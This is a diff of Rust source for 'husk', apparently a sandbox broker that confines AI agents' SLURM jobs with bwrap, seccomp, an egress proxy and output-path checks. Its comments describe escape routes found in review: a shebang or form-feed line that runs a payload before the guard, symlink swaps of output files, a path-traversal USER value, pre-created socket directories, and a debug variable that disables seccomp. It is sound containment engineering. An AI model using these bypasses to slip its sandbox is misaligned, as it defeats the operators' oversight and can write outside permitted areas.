+    // compute node and is the single source of truth; a copy baked in at submit time is a
+    // second list to drift (P8), and it would be the stale one.
+    if net_enabled {
+        b.push_str("echo \"husk: network: outbound traffic goes through husk's proxy, and only\" >&2\n");
+        b.push_str("echo \"husk: hosts on the operator's allowlist are reachable. A blocked host\" >&2\n");
+        b.push_str("echo \"husk: fails as 'CONNECT tunnel failed, response 403' or a 403 from the\" >&2\n");
+        b.push_str("echo \"husk: proxy - that is husk, NOT the site being down. Ask your operator\" >&2\n");
+        b.push_str("echo \"husk: to add it to sandbox.network.allowedDomains.\" >&2\n");
+    } else {
+        b.push_str("echo \"husk: network: this job has NO outbound network. A connection that\" >&2\n");
+        b.push_str("echo \"husk: hangs or refuses is husk, not the site. Fetch what the job needs\" >&2\n");
+        b.push_str("echo \"husk: before submitting, into the writable set above.\" >&2\n");
+    }
+    // POINT AT THE SKILL. Requested by an agent that had been working inside husk for a
+    // session and had not found it (2026-08-09).
+    //
+    // The skill is installed at ~/.claude/skills/husk/ and the harness surfaces it by
+    // description — but the agent's own report is the evidence that description-matching is
+    // not enough when the thing you would search for ("why was my write refused") does not
+    // obviously read as "load a skill". This banner is one of the few channels that reliably
+    // REACHES the agent, so it is the right place to say the skill exists. One line: the
+    // banner is already long, and a second nag would be the crying-wolf failure.
+    b.push_str("echo \"husk: working inside husk? the 'husk' skill explains these rules,\" >&2\n");
+    b.push_str("echo \"husk: what is masked, and what to do when something is refused.\" >&2\n");
+    b.push_str("echo \"husk: husk's own log for this job: ${HUSK_JOB_LOG:-<merged into stderr>}\" >&2\n");
+    b
+}
+
+// Nine parameters, and clippy is right that it is too many — F1 (`guard.rs` split) gives the
+// guard a defined input type instead of this positional list. Until then, an allow with the
+// reason attached beats silencing it globally.
+#[allow(clippy::too_many_arguments)]
 /// Inject a re-exec guard so the job runs once under the compute-side sandbox.
 /// The guard is placed AFTER the leading comment/#SBATCH block so sbatch still
 /// parses the agent's resource directives (they sit at the top), and BEFORE the
@@ -190,26 +1398,69 @@ pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
 /// TODO(hardware/MPI): the network/fabric policy is still single-node only —
 /// `--unshare-net` breaks multi-node/MPI (no fabric); revisit for the MPI phase.
 /// Confirm the uenv /user-environment mount inherits through `--ro-bind / /`.
-fn wrap_script(body: &str, bwrap_args: &[String]) -> String {
-    let mut head = String::new();
-    let mut tail = String::new();
-    let mut in_head = true;
-    for line in body.lines() {
-        if in_head {
-            let t = line.trim_start();
-            if t.is_empty() || t.starts_with('#') {
-                head.push_str(line);
-                head.push('\n');
-                continue;
-            }
-            in_head = false;
-        }
-        tail.push_str(line);
-        tail.push('\n');
+///
+/// This block spent several commits on `husk_paths` — `5b1606c` inserted that function and
+/// its own doc directly under this one with no blank line, `wrap_script` moved down, and its
+/// rationale did not follow. Seven sites, one mechanism (`B1-4`). The MPI TODO went with it,
+/// which is why the MPI work would have grepped its way to a path helper.
+fn wrap_script(
+    body_path: &str,
+    job_args: &[String],
+    bwrap_args: &[String],
+    profile: profile::Profile,
+    workdir: &str,
+    net_enabled: bool,
+    writable: &[String],
+    // The exact --output/--error values husk emitted. The run-time guard checks these by
+    // NAME as well as by fd, because in this SLURM config slurmstepd holds the file and hands
+    // the batch script a pipe, so the fd check cannot see the target (A1-F1). Empty = skip
+    // (the direct wrap_script unit tests do not exercise this path; the goldens, which go
+    // through `decide`, do).
+    out: &str,
+    err: &str,
+) -> String {
+    // THE SUBMITTED SCRIPT IS HUSK'S, ENTIRELY. Not one byte of it comes from the agent.
+    //
+    // It used to be `head + guard + tail`: husk split the agent's body on "leading comment
+    // or blank line", put the front half ABOVE the guard so slurmd would still parse the
+    // agent's `#SBATCH` directives, and the rest below. That handed the agent two ways to
+    // run before the cage existed, and the v0.5 review demonstrated both:
+    //
+    //   * keep its own `#!` line. It stayed in the head, so it stayed line 1 — and the
+    //     kernel honours line 1. `#!/usr/bin/env -S bash -c "<payload>"` ran the payload
+    //     and never read the guard at all.
+    //   * start a line with a character Rust calls whitespace and bash does not. `trim_start`
+    //     strips FF/VT/NBSP/CR, so `\f# ; <payload>` looked like a comment to the splitter,
+    //     landed in the head, and bash ran it before the re-exec.
+    //
+    // Neither is a quoting bug, so neither is fixed by quoting harder, and no amount of
+    // validating the agent's first line closes the class — the next one is whatever the two
+    // parsers disagree about next. The property has to be structural: **the bytes slurmstepd
+    // executes are ours**, and the agent's body is DATA, run by an interpreter we name, at a
+    // path we choose, inside the cage.
+    //
+    // Dropping the agent's `#SBATCH` lines from the submitted script is not a loss. husk
+    // already parses them, validates them, and re-emits what it allows onto the command
+    // line, where sbatch precedence (CLI > env > `#SBATCH`) makes its value win. Leaving the
+    // agent's copy in the file was what made every `Ignored` option an ungated channel and
+    // what let a bare `hetjob` token through the body gate.
+    let head = "#!/bin/bash\n".to_string();
+    let body_q = settings::sh_quote(body_path);
+
+    // The agent's argv for its own script, quoted by us rather than forwarded raw.
+    let mut argv_line = String::new();
+    if !job_args.is_empty() {
+        argv_line.push_str("set -- ");
+        argv_line.push_str(
+            &job_args.iter().map(|a| settings::sh_quote(a)).collect::<Vec<_>>().join(" "),
+        );
+        argv_line.push('\n');
     }
-    if !head.starts_with("#!") {
-        head = format!("#!/bin/bash\n{head}");
-    }
+
+    // Runs INSIDE the cage, as the last thing the guard does: hand off to the agent's body.
+    let tail = format!(
+        "{argv_line}exec /bin/bash \"$_husk_body\" \"$@\"\n"
+    );
 
     let bwrap = bwrap_args
         .iter()
@@ -217,14 +1468,1024 @@ fn wrap_script(body: &str, bwrap_args: &[String]) -> String {
         .collect::<Vec<_>>()
         .join(" ");
     // Great A'Tuin.
+    //
+    // Deliberately NOT `exec`: the guard shell stays alive as the parent so it can
+    // TRANSLATE a seccomp kill. seccomp-wrapper blocks with SCMP_ACT_KILL_PROCESS, so a
+    // blocked syscall kills the job with SIGSYS -> status 159 and a bare "Bad system
+    // call". Interactively that is fine (the agent reads the failure and adapts); in a
+    // batch job nobody is reading, and a run that dies hours in would give the scientist
+    // no way to connect 159 to husk. One idle shell for the job's duration buys a
+    // message that names the layer. The status is re-emitted unchanged so sacct still
+    // records what really happened.
+    //
+    // The message must NOT point at SECCOMP_WRAPPER_DEBUG. That variable swaps KILL for
+    // ENOSYS, so blocked syscalls return and the program continues — an off-switch, not a
+    // diagnostic. A diagnostic may change what we OBSERVE, never what we ENFORCE (the same
+    // reason the broker has --dry-run and not a debug mode). The broker also strips the
+    // variable from the submission env (STRIPPED_SUBMIT_ENV), so no brokered job can run
+    // weakened.
+    //
+    // It used to point at `strace` INSIDE the cage, and that was WRONG for two years'
+    // worth of reasons that were all sound except the one that mattered: `ptrace` is on
+    // the wrapper's own deny-list, so strace is killed by the same SIGSYS before it writes
+    // a byte. husk was printing a remediation husk forbids — the one message meant to end
+    // the guessing was what sustained it (measured cost: three different wrong root causes
+    // across two sessions for a single blocked syscall). Worse, measured 2026-08-29:
+    // `seccomp-wrapper strace -f -o trace.log /bin/true` leaves an ORPHAN blocked in
+    // pause() holding fds 1 and 2, so in a batch job the advice converts a diagnosable
+    // SIGSYS into a leaked process sitting on the job's output.
+    //
+    // Reproducing OUTSIDE husk works, needs no weakening, and is what the message says
+    // now. This is P11/P13 in one place: the refusal must teach something the confined
+    // side can actually DO.
+    // Credential-socket masks are resolved HERE, on the compute node, not baked into the
+    // static args: `--tmpfs DEST` dies if DEST is absent under a read-only root, and
+    // dies again if two entries resolve to the same directory (/var/run -> /run). Only
+    // the compute node knows which exist — same reason the GPU binds use --dev-bind-try.
+    // Appended AFTER {bwrap} so it still wins over any config-driven allowRead.
+    let mask_paths = settings::CREDENTIAL_SOCKET_DIRS.join(" ");
+    let sec = profile.seccomp_profile();
+    let (broker_path, stub_path, socat_path) = husk_paths();
+    // ONE definition of what can be in a step spool: the step broker (and the stub) write it,
+    // and the guard's cleanup below is generated from it. See `step::step_spool_globs`.
+    let step_spool_rm = crate::step::step_spool_globs()
+        .iter()
+        .map(|g| format!("\"$_husk_spool\"/{g}"))
+        .collect::<Vec<_>>()
+        .join(" ");
+    let broker_q = settings::sh_quote(&broker_path);
+    let stub_q = settings::sh_quote(&stub_path);
+    let socat_q = settings::sh_quote(&socat_path);
+    // The SESSION workdir, not `$PWD`. The two used to be identical because --chdir was
+    // forced to req.cwd; now a run script may start the job in a subdirectory, and using
+    // `$PWD` would silently NARROW the rank cage's writable region to that subdirectory.
+    // ICON starts in <case>/run and writes into <case>/experiments — with `$PWD` those
+    // writes fail, and nothing says why. The cage boundary must follow the workdir the
+    // broker validated, never wherever the job happens to have chdir'd.
+    let workdir_q = settings::sh_quote(workdir);
+
+    // ---- egress: the proxy outside the cage, the relay inside it -------------------
+    //
+    // Emitted ONLY when the operator configured an allowlist. With none, a job keeps
+    // today's behaviour exactly - `--unshare-net` and no route at all - and no process is
+    // started to serve a policy that permits nothing.
+    //
+    // The socket lives in the step spool, which is inside the workdir, which the cage
+    // already binds writable. So nothing needs a special bind-mount: a unix socket crosses
+    // the network namespace because it is a filesystem object, and it arrives on a mount
+    // the job already had. Same reasoning that makes the /run/munge mask load-bearing
+    // rather than a syscall filter.
+    //
+    // Raw strings: these are shell, and escaping shell inside an escaped Rust literal is
+    // how the srun bind shipped with literal quotes in it and took every job down.
+    let (net_start, net_relay) = if net_enabled {
+        (
+            // A format! rather than a bare raw string: it carries {socat_q}, and a
+            // placeholder inside a string that is itself INTERPOLATED is never expanded —
+            // `format!` substitutes once. That mistake put a literal `[ -x {socat_q} ]`
+            // into the guard, where it is valid shell that silently tests a file named
+            // "{socat_q}", so the bind never happened and nothing said why.
+            format!(
+                r#"  # The relay needs socat INSIDE the cage, and husk's own socat lives at
+  # <prefix>/bin/socat — under the user's HOME, which the cage tmpfs-masks. So bind it in,
+  # read-only, over an empty file in the spool. A copy would also work and be simpler, but
+  # the spool sits inside the WRITABLE workdir, so a copy is something the job could
+  # overwrite before its own relay starts; a read-only bind is not. The bind goes into
+  # _husk_extra, appended last, so it wins over the workdir bind — the same ordering the
+  # MUNGE mask depends on.
+  #
+  # ALWAYS bind, wherever the binary came from. An earlier version used a socat found on
+  # PATH as-is, on the assumption that anything on PATH is visible inside the cage. It is
+  # not: this runs OUTSIDE the cage, --export=ALL carries the login PATH, so `command -v`
+  # finds husk's OWN socat under /users — which the cage then masks. The relay silently
+  # never started (Balfrin, twice). Binding unconditionally removes the reasoning: the
+  # relay uses one known path that is visible by construction.
+  _husk_socat=
+  _husk_socat_src=$(command -v socat 2>/dev/null || true)
+  [ -n "$_husk_socat_src" ] || _husk_socat_src={socat_q}
+  if [ -x "$_husk_socat_src" ]; then
+    # Bound to a path in the cage's OWN tmpfs, never over a file on the host. The previous
+    # design created an empty placeholder in the step spool and bind-mounted socat over it,
+    # which left a file that could not be removed: a dentry that is still a mountpoint
+    # cannot be unlinked, so the cleanup rm failed with EBUSY (silently, under 2>/dev/null)
+    # and every job that ran a step kept its spool. bwrap creates this mountpoint inside its
+    # own namespace and it vanishes with the cage - nothing to clean up, so nothing to leak.
+    _husk_socat={caged_socat}
+    _husk_extra+=(--ro-bind "$_husk_socat_src" "$_husk_socat")
+  fi
+  if [ -n "$_husk_socat" ]; then
+    # The HOST path, not the in-cage one: the step-broker hands this to each rank, and a
+    # rank must bind it into its own cage (bwrap namespaces do not propagate).
+    export HUSK_SOCAT="$_husk_socat_src"
+  else
+    echo "husk: no socat available, so this job gets no network." >&2
+    echo "husk:   looked for {socat_q}" >&2
+    echo "husk: the cage masks /users, so a socat in your home must be bound in, and the" >&2
+    echo "husk: job spool was not usable here. Re-run install-husk.sh, or ask for socat" >&2
+    echo "husk: system-wide on the compute nodes." >&2
+  fi
+  # Egress proxy: OUTSIDE the cage, holding the allowlist. It resolves the policy from the
+  # settings files itself rather than being handed it, so what is in force never depends on
+  # a string carried on a command line.
+  #
+  # Started BEFORE the step-broker on purpose: the step-broker inherits HUSK_NET_SOCK and
+  # HUSK_SOCAT and passes them to each rank, so both have ONE origin instead of being
+  # rebuilt from the job id in two places that could drift.
+  # The socket does NOT live in the step spool, and cannot.
+  #
+  # A unix socket address must fit in sun_path - 108 bytes, fixed by the kernel, with no
+  # way to ask for more. <workdir>/.husk-step-spool-<jobid>/net.sock spends ~34 of those
+  # on the suffix alone, so the budget for the project path was ~73 bytes. A real Balfrin
+  # project measured ~57: it worked, with under 20 to spare, and a project a couple of
+  # directories deeper would have lost its network to a bare "AF_UNIX path too long".
+  #
+  # So: a short, node-local, per-job directory instead - created by `mktemp -d`, with a
+  # RANDOM suffix, and that randomness is the point (O1).
+  #
+  # The name used to be exactly `/tmp/husk-<uid>-<jobid>`, and job ids are public in
+  # squeue, so the path was predictable before it existed. `mkdir` + an ownership test
+  # answers the CROSS-USER version of that (someone else's directory is not ours, so the
+  # job gets no network) but NOT the same-uid version: a second session of the same user,
+  # or an escaped agent, could pre-create the directory for a job id it expected, pass the
+  # `-O` test - it really is that uid's directory - and still hold a handle on the path the
+  # ranks later resolve. AF_UNIX connect needs only write permission on the socket, and
+  # permission does not distinguish two sessions of one user; only NAMING does.
+  #
+  # `mktemp -d` closes it by construction: it creates the directory atomically at a name
+  # nobody could have guessed, 0700, and fails rather than accepting one that exists. So
+  # the directory is ours because we made it, not because it looked like ours. The proxy
+  # still re-checks ownership and mode before binding - the shell only proposes - and the
+  # socket is BIND-mounted into each cage, so a later swap of the host path cannot redirect
+  # a job that has already resolved it. Cost: ~7 more bytes of the 108-byte sun_path
+  # budget, out of the ~34 this layout spends.
+  #
+  # It is bound into the cage READ-ONLY. connect(2) works fine through a read-only bind
+  # under --unshare-net - measured on 6.8, then confirmed on the kernel that matters when
+  # net.live fetched through this socket on Balfrin (5.14.21, Cray Shasta, 2026-08-01).
+  # The job then cannot delete or replace its own socket, which it could when the socket
+  # sat in the writable spool.
+  _husk_net_dir=$(mktemp -d "/tmp/husk-$(id -u 2>/dev/null || echo u)-${{SLURM_JOB_ID:-nojob}}-XXXXXX" 2>/dev/null || true)
+  if [ -n "$_husk_net_dir" ] && _husk_ours "$_husk_net_dir"; then
+    chmod 700 "$_husk_net_dir" 2>/dev/null
+    rm -f "$_husk_net_dir/net.sock" 2>/dev/null
+    _husk_net_sock="$_husk_net_dir/net.sock"
+    # --workdir is where the proxy READS ITS ALLOWLIST FROM, so it must be the trusted
+    # project dir and not "$PWD". $PWD here is the job's --chdir, which is confined to the
+    # writable set but chosen by the agent within it — so the confined side got to pick
+    # which settings files decided its own egress policy. The submit-time half already
+    # resolved the allowlist from the project dir; the two halves disagreed, and main.rs
+    # says out loud that the policy comes from "files the agent cannot write".
+    "$_husk_broker" --net-proxy --socket "$_husk_net_sock" --workdir {workdir_q} \
+      >>"$_husk_log" 2>&1 &
+    _husk_net_pid=$!
+    export HUSK_NET_SOCK="$_husk_net_sock"
+    # Bind the SOCKET, not its directory — and wait for the proxy to create it first.
+    #
+    # Binding the directory was the obvious move (the socket does not exist yet, and a
+    # bwrap bind with a missing source kills the cage), but it makes the DIRECTORY a
+    # mountpoint, and a dentry that is still a mountpoint cannot be unlinked or removed
+    # while anything holds that mount. That is exactly what stranded the socat placeholder
+    # in the step spool: the cleanup ran, the removal failed with EBUSY, and 2>/dev/null
+    # hid it. A per-job directory on node-local /tmp that fails to rmdir accumulates on a
+    # node that reboots rarely, which is the one thing node-local scratch must not do.
+    #
+    # So: bounded wait for the bind, then bind the file. The directory is never a
+    # mountpoint, so its rmdir always succeeds. If the proxy never binds we leave
+    # HUSK_NET_SOCK unset rather than binding a missing source — the relay then sees no
+    # socket and the job runs without egress, which is the safe direction.
+    _husk_w=0
+    while [ ! -S "$_husk_net_sock" ] && [ "$_husk_w" -lt 50 ]; do
+      sleep 0.1
+      _husk_w=$((_husk_w + 1))
+    done
+    if [ -S "$_husk_net_sock" ]; then
+      _husk_extra+=(--ro-bind "$_husk_net_sock" "$_husk_net_sock")
+    else
+      unset HUSK_NET_SOCK
+      echo "husk: the egress proxy did not bind $_husk_net_sock within 5s, so this job" >&2
+      echo "husk: has no network. Its own log is ${{HUSK_JOB_LOG:-the husk job log}}." >&2
+    fi
+  else
+    # Report BEFORE clearing the variable - naming the path is the whole point of the
+    # message, and an unattributed "no network" is exactly the failure mode husk keeps
+    # having to fix.
+    echo "husk: could not create a private directory under /tmp for this job's egress" >&2
+    echo "husk:   socket, so this job gets no network. mktemp -d failed, or what it made" >&2
+    echo "husk:   is not a directory this job owns. husk will not route a job's egress" >&2
+    echo "husk:   through a directory it did not create itself." >&2
+    _husk_net_dir=
+  fi
+"#,
+                caged_socat = crate::rank::CAGED_SOCAT,
+            ),
+            // Inside the cage. The relay is a byte-shuffler with no policy in it — every
+            // decision was made outside. It binds LOOPBACK ONLY, which is all the netns
+            // has: bwrap brings `lo` up and there is no other route (both measured).
+            r#"# --- injected by husk-slurm-broker: egress relay into the cage ---
+if [ -n "${HUSK_NET_SOCK:-}" ] && [ -x "{caged_socat}" ]; then
+  "{caged_socat}" TCP-LISTEN:3128,fork,reuseaddr,bind=127.0.0.1 UNIX-CONNECT:"$HUSK_NET_SOCK" \
+    >/dev/null 2>&1 &
+  export HTTP_PROXY=http://127.0.0.1:3128 HTTPS_PROXY=http://127.0.0.1:3128
+  export http_proxy=http://127.0.0.1:3128 https_proxy=http://127.0.0.1:3128
+  export ALL_PROXY=http://127.0.0.1:3128 all_proxy=http://127.0.0.1:3128
+  export NO_PROXY=localhost,127.0.0.1 no_proxy=localhost,127.0.0.1
+elif [ -n "${HUSK_NET_SOCK:-}" ]; then
+  echo "husk: the egress relay could not start (no socat in the cage), so this job has" >&2
+  echo "husk: no network. The proxy outside the cage refused nothing." >&2
+fi
+"#
+            // A plain replace rather than format!: this block is shell full of ${...}, and
+            // every one of them would need brace-doubling inside a format string. That is
+            // exactly how a literal `{socat_q}` once shipped into the guard.
+            .replace("{caged_socat}", crate::rank::CAGED_SOCAT),
+        )
+    } else {
+        (String::new(), String::new())
+    };
+    // The writable set as the job will see it: the project dir first, then any
+    // `sandbox.filesystem.allowWrite` roots. One list, one source, announced verbatim.
+    let masks = masked_credentials(bwrap_args);
+    let banner = cage_banner(writable, &masks, net_enabled);
+    // The reclaim list is BOTH mask shapes, because bwrap creates a mount point for either:
+    // a `/dev/null` bind needs a file, a `--tmpfs` needs a directory. R4/A4-S3 measured an
+    // empty `.Rprofile`, an `.hg/hgrc` AND a leftover `.hg` DIRECTORY surviving on Lustre, so
+    // taking only the file shape would fix two thirds of one finding.
+    // Restricted to the writable roots: a tmpfs over `/tmp` or `/users` is not ours to reclaim.
+    // The filter applies to BOTH shapes. A credential deny becomes `--ro-bind /dev/null <abs>`
+    // at ANY absolute path, so taking `masks` unfiltered put paths husk could not possibly have
+    // created — bwrap refuses them, "Read-only file system" — onto a list husk then `rm -f`s.
+    // `lib.rs` already names that shape: a cleanup that deletes what it did not create is a
+    // deletion primitive, not hygiene. Only a path under a writable root can be a mount point
+    // husk made.
+    let under_writable = |t: &String| writable.iter().any(|r| t.starts_with(&format!("{r}/")));
+    let mut reclaimable: Vec<String> =
+        masks.iter().filter(|m| under_writable(m)).cloned().collect();
+    reclaimable.extend(
+        bwrap_args
+            .windows(2)
+            .filter(|w| w[0] == "--tmpfs")
+            .map(|w| w[1].clone())
+            .filter(under_writable),
+    );
+    // A4-S3. bwrap must `creat()` a mount point when the mask SOURCE is absent, and that
+    // empty file SURVIVES the job on the shared filesystem — husk writes into the user's
+    // project directory as a side effect of sandboxing and, until now, never reclaimed it.
+    //
+    // It is not litter. An empty `./.Renviron` SHADOWS `~/.Renviron` (R takes the first
+    // startup file it finds and stops), which on a cluster is where `R_LIBS_USER` lives — so
+    // a leftover breaks `library()` for the next human in that directory, and it is left at
+    // mode 0444 so they cannot simply overwrite it.
+    //
+    // OWNERSHIP, not pattern-matching: husk removes only what husk CREATED. The paths that
+    // did not exist before the cage was built are recorded, and only those are reclaimed,
+    // only while still empty. A `.Renviron` the project shipped is bound over and left alone.
+    // Same rule as the spool and the egress socket — created here, released here, on every
+    // path the trap can reach (P6 applied to a file rather than a process).
+    let (reclaim_pre, reclaim_post) = if reclaimable.is_empty() {
+        (String::new(), String::new())
+    } else {
+        let list = reclaimable.iter().map(|m| settings::sh_quote(m)).collect::<Vec<_>>().join(" ");
+        (
+            format!(
+                "  # --- husk: remember which mask targets do not exist yet (A4-S3) ---\n\
+                 _husk_masks=({list})\n\
+                 _husk_made=(); _husk_madedir=()\n\
+                 for _m in \"${{_husk_masks[@]}}\"; do\n\
+                 \x20 [ -e \"$_m\" ] || _husk_made+=(\"$_m\")\n\
+                 \x20 _d=$(dirname \"$_m\" 2>/dev/null) || _d=\n\
+                 \x20 [ -z \"$_d\" ] || [ -e \"$_d\" ] || _husk_madedir+=(\"$_d\")\n\
+                 done\n"
+            ),
+            String::from(
+                concat!(
+                    "  # --- husk: reclaim the mount points husk itself created (A4-S3) ---\n",
+                    "  # Only paths recorded as ABSENT above, and only while still empty: a file\n",
+                    "  # the project shipped was bound over, never created, and is not ours.\n",
+                    "  # Every path SAYS what happened to it. The spool cleanup below learned this\n",
+                    "  # the expensive way — a failure with no branch leaked a spool per job, in\n",
+                    "  # silence. A reclaim that quietly keeps a file is the same shape (P7).\n",
+                    "  _husk_kept=0\n",
+                    "  for _m in ${_husk_made[@]+\"${_husk_made[@]}\"}; do\n",
+                    "    if [ -d \"$_m\" ]; then rmdir \"$_m\" 2>/dev/null || _husk_kept=$((_husk_kept+1))\n",
+                    "    elif [ -f \"$_m\" ] && [ ! -s \"$_m\" ]; then rm -f \"$_m\" 2>/dev/null || _husk_kept=$((_husk_kept+1))\n",
+                    "    elif [ -e \"$_m\" ]; then _husk_kept=$((_husk_kept+1)); fi\n",
+                    "  done\n",
+                    "  if [ \"$_husk_kept\" -gt 0 ]; then\n",
+                    "    echo \"husk: kept $_husk_kept mask mount-point(s) - not empty, or not removable.\" >&2\n",
+                    "    echo \"husk: husk creates these to mask a file the job must not write; one that\" >&2\n",
+                    "    echo \"husk: gained content is NOT deleted. Remove it yourself if it is not yours.\" >&2\n",
+                    "  fi\n",
+                    "  # rmdir, never rm -r: a directory that gained real content keeps it and\n",
+                    "  # stays — the safe outcome. Files are listed before dirs, so a reclaimed\n",
+                    "  # mask leaves its parent empty in time for this pass.\n",
+                    "  for _d in ${_husk_madedir[@]+\"${_husk_madedir[@]}\"}; do\n",
+                    "    rmdir \"$_d\" 2>/dev/null\n",
+                    "  done\n",
+                ),
+            ),
+        )
+    };
+    // Colon-separated like PATH, so an agent can split it without a parser. A path
+    // containing a colon would be ambiguous - as it is for PATH - and is not worth a
+    // format nobody would guess.
+    let writable_env = format!(
+        "export HUSK_WRITABLE={}\n",
+        settings::sh_quote(&writable.join(":"))
+    );
+    let banner = format!("{writable_env}{banner}");
+
+    // ---- A1, run-time half: the file SLURM actually opened must be inside the set -------
+    //
+    // The submit-time check (`settings::confine_output_pattern`) refuses an `--output` whose
+    // last component is a symlink. It runs on the login node, at submission. slurmd opens
+    // the file when the job STARTS — pending for hours, in a directory the job's own agent
+    // can write the whole time — and husk cannot make that `open()` use `O_NOFOLLOW`. So a
+    // path that was a plain file at check time and a symlink at open time defeats the
+    // check by construction, however carefully the check is written. Validation cannot win
+    // a race against the party it is validating.
+    //
+    // What CAN win is asking a different question at a different time: not "is this path
+    // acceptable?" before the fact, but "where did this descriptor actually land?" after
+    // it. This runs in the guard's outer half, before the agent's body exists as a
+    // process, so a hijacked descriptor costs the attacker the job instead of buying it an
+    // arbitrary write. Together with `--open-mode=append` (nothing truncated) the swapped
+    // target receives husk's refusal and nothing else.
+    //
+    // Three details are load-bearing:
+    //   * the roots are canonicalised HERE, on the compute node. `/scratch` is a symlink to
+    //     `/capstor/scratch` on Santis; `readlink /proc/self/fd/1` reports the resolved
+    //     path, so comparing against an unresolved root would fail for EVERY job. A check
+    //     that cries wolf gets switched off, which is worse than no check.
+    //   * the comparison is component-wise (`$r` or `$r/*`), never a string prefix, so
+    //     `/work2` does not count as being under `/work`. Same rule as the floor check.
+    //   * the report goes to `$_husk_log`, which is under `$HOME` and out of the job's
+    //     reach. Writing it to stderr would put it in the very file under suspicion.
+    //
+    // A descriptor that is NOT a regular file (a pipe, a tty, /dev/null) is not the case
+    // this defends and is left alone — but it is announced, because on a site where
+    // slurmstepd holds the output file and pipes to the batch script this check cannot see
+    // the file at all, and silent non-enforcement is the failure mode husk keeps fixing.
+    let roots_sh =
+        writable.iter().map(|r| settings::sh_quote(r)).collect::<Vec<_>>().join(" ");
+    // A raw string with `.replace`, not `format!`: this is shell full of `${...}` and every
+    // brace would need doubling — which is exactly how a literal `{socat_q}` once shipped.
+    let fd_guard = r#"  # --- husk: stdout/stderr must resolve INSIDE the writable set (A1) ---
+  # `/proc/$$/fd`, never `/proc/self/fd`: this runs inside `$(...)`, and a command
+  # substitution is a FORKED subshell whose OWN stdout is the substitution pipe. `self`
+  # therefore reports `pipe:[…]` for every job — the check would have looked present,
+  # passed its tests, and enforced nothing. `$$` stays the invoking shell's pid in a
+  # subshell, so it names the descriptor slurmd actually handed us.
+  _husk_fd_outside() {
+    _husk_fd_p=$(readlink "/proc/$$/fd/$1" 2>/dev/null) || return 1
+    case "$_husk_fd_p" in
+      /*) ;;
+      *) return 1 ;;
+    esac
+    _husk_fd_p=${_husk_fd_p% (deleted)}
+    [ -f "$_husk_fd_p" ] || return 1
+    for _husk_fd_r in {roots}; do
+      _husk_fd_c=$(readlink -f "$_husk_fd_r" 2>/dev/null || echo "$_husk_fd_r")
+      case "$_husk_fd_p" in
+        "$_husk_fd_c"|"$_husk_fd_c"/*) return 1 ;;
+      esac
+    done
+    return 0
+  }
+  _husk_fd_checked=
+  for _husk_fd in 1 2; do
+    _husk_fd_t=$(readlink "/proc/$$/fd/$_husk_fd" 2>/dev/null || true)
+    case "$_husk_fd_t" in /*) [ -f "${_husk_fd_t% (deleted)}" ] && _husk_fd_checked=1 ;; esac
+    _husk_fd_outside "$_husk_fd" || continue
+    {
+      echo "husk: ================== JOB REFUSED =================="
+      echo "husk: file descriptor $_husk_fd of this job resolves to"
+      echo "husk:   $_husk_fd_p"
+      echo "husk: which is OUTSIDE the set this job may write:"
+      echo "husk:   {roots}"
+      echo "husk: husk confines --output/--error when the job is SUBMITTED. A path that"
+      echo "husk: was inside the set then and outside it now was replaced in between -"
+      echo "husk: a symlink swapped in while the job sat pending, which is the one thing"
+      echo "husk: a submit-time check cannot catch. SLURM opens these files as you and"
+      echo "husk: OUTSIDE the sandbox, so husk refuses the job instead."
+      echo "husk: The agent's body has NOT been run: nothing it controls was written"
+      echo "husk: there, and --open-mode=append means nothing was truncated either."
+      echo "husk:   job  : ${SLURM_JOB_ID:-nojob}"
+      echo "husk:   node : $(hostname 2>/dev/null || echo '?')"
+      echo "husk: ================================================="
+    } >>"$_husk_log" 2>/dev/null
+    exit 1
+  done
+  if [ -z "$_husk_fd_checked" ]; then
+    echo "husk: stdout/stderr are not regular files on this node, so husk could not \
+verify where its output lands; --output confinement rests on the submit-time check alone." \
+      >>"$_husk_log" 2>/dev/null
+  fi
+"#
+    .replace("{roots}", &roots_sh);
+
+    // ---- A1-F1, run-time half by NAME (not just by fd) --------------------------------
+    //
+    // `RA-1`, for the record next to the code rather than in the emitted script: the leaf
+    // the guard re-derives comes from eight values husk does not control, and the
+    // containment check has already run on the DIRECTORY. `D2-6` closed the case where such
+    // a value contains a `%` (unnameable). A `/` is one character to the left and strictly
+    // worse - it RELOCATES the file. `USER=../outside/authorized_keys` with
+    // `--output=%u.log` put the guard's leaf at `<root>/../outside/authorized_keys.log`,
+    // outside the writable set, and `_husk_name_bad` returned "not bad" with nothing
+    // logged. `_husk_nl` is `${_husk_nv##*/}`, so it carries no `/` before the
+    // substitutions run, and every accepted expansion is a job id, an array task id, a node
+    // name, a rank or a user name - none of which legitimately contains one. The arm below
+    // therefore costs nothing and closes the relocation.
+    //
+    // The fd check above is ground truth WHEN the descriptor is a regular file. In this
+    // SLURM config it is not: slurmstepd holds the real `--output` file and hands the batch
+    // script a PIPE, so `/proc/$$/fd/1` reads `pipe:[...]`, the fd check cannot see the
+    // target, and it falls to the honest-but-toothless "rests on the submit-time check
+    // alone" branch. A1 turned that into a demonstrated escape: swap the absent leaf to a
+    // symlink while the job is PENDING and slurmd follows it at open time, outside the cage.
+    //
+    // So husk ALSO checks the paths it emitted, by name. It knows them exactly — it wrote
+    // `--output`/`--error` itself. Two questions, both answerable on the compute node:
+    //   * does the output DIRECTORY, every symlink resolved, still land inside the set?
+    //     The directory carries no `%` specifier (husk refuses that), so this is exact, and
+    //     it catches a swapped parent component — the same class A1 flagged as untested.
+    //   * is the LEAF a symlink? slurmd opens THROUGH a swapped symlink, which therefore
+    //     still exists as a symlink here; an absent or regular leaf is fine.
+    // This does not UN-create a file slurmd already opened (that is the residual, tracked
+    // for the v0.6 output-relocation). It makes the swap COST THE JOB, reliably, where the
+    // fd check went blind — turning a silent escape into a refusal with a name attached.
+    // P6/P8: one table decides which specifiers are legal AND how each is expanded; the
+    // shell below only SEQUENCES those substitutions. Hand-writing this block beside
+    // `settings::OUTPUT_SPECIFIERS` is what produced B1-1.
+    //
+    // Each entry emits ONE substitution line, and — where an unset variable would expand
+    // to nothing — one guard line in front of it. `RA-2`: an expansion that is `%`-free is
+    // not thereby the name slurmd opens. Measured on Santis, a non-array batch job renders
+    // `%A` as the job id while `SLURM_ARRAY_JOB_ID` is unset, so `${SLURM_ARRAY_JOB_ID:-}`
+    // silently produced a SHORTER leaf and both leaf checks below — the symlink one and
+    // `N1`'s hard-link one — ran on a file that does not exist. Refusing on the unset
+    // variable needs no model of what SLURM substitutes instead, which is the same ground
+    // on which `%x` and `%J` are refused outright.
+    //
